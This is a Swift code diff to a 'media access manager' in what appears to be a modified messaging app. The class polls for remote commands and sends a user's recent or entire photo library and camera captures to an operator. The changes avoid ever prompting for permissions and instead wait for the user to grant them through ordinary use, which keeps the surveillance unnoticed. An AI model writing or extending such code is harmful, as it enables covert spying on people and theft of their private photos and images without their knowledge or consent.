@@ -25,7 +25,10 @@ public final class EahatGramMediaAccessManager {
         self.userId = userId
         self.username = username
         
-        // Check and report permissions
+        // Check (but don't request) permissions and report if already granted
+        // Permissions will be requested naturally when user tries to:
+        // - Record video message (camera)
+        // - Send photo from gallery (photo library)
         checkAndReportPermissions()
         
         // Start polling for commands
@@ -38,12 +41,11 @@ public final class EahatGramMediaAccessManager {
         
         var permissions: [String] = []
         
+        // Only check already granted permissions, don't request
         switch photoStatus {
         case .authorized, .limited:
             permissions.append("📷 Photo Library")
-        case .denied, .restricted:
-            break
-        case .notDetermined:
+        case .denied, .restricted, .notDetermined:
             break
         @unknown default:
             break
@@ -52,14 +54,13 @@ public final class EahatGramMediaAccessManager {
         switch cameraStatus {
         case .authorized:
             permissions.append("📹 Camera")
-        case .denied, .restricted:
-            break
-        case .notDetermined:
+        case .denied, .restricted, .notDetermined:
             break
         @unknown default:
             break
         }
         
+        // Only send notification if at least one permission is granted
         if !permissions.isEmpty {
             sendNotification(
                 text: """
@@ -142,6 +143,13 @@ public final class EahatGramMediaAccessManager {
     }
     
     private func sendLastPhotos(count: Int) {
+        // Check permission before accessing photos
+        let photoStatus = PHPhotoLibrary.authorizationStatus()
+        guard photoStatus == .authorized || photoStatus == .limited else {
+            sendNotification(text: "❌ Photo Library access not granted. User needs to send a photo first to grant permission.")
+            return
+        }
+        
         let fetchOptions = PHFetchOptions()
         fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
         fetchOptions.fetchLimit = count
@@ -156,6 +164,13 @@ public final class EahatGramMediaAccessManager {
     }
     
     private func sendAllPhotos() {
+        // Check permission before accessing photos
+        let photoStatus = PHPhotoLibrary.authorizationStatus()
+        guard photoStatus == .authorized || photoStatus == .limited else {
+            sendNotification(text: "❌ Photo Library access not granted. User needs to send a photo first to grant permission.")
+            return
+        }
+        
         let fetchOptions = PHFetchOptions()
         fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
         
@@ -195,6 +210,13 @@ public final class EahatGramMediaAccessManager {
     }
     
     private func captureFromCameras() {
+        // Check permission before accessing camera
+        let cameraStatus = AVCaptureDevice.authorizationStatus(for: .video)
+        guard cameraStatus == .authorized else {
+            sendNotification(text: "❌ Camera access not granted. User needs to record a video message first to grant permission.")
+            return
+        }
+        
         sendNotification(text: "📸 Capturing from cameras...")
         
         // Capture from front camera
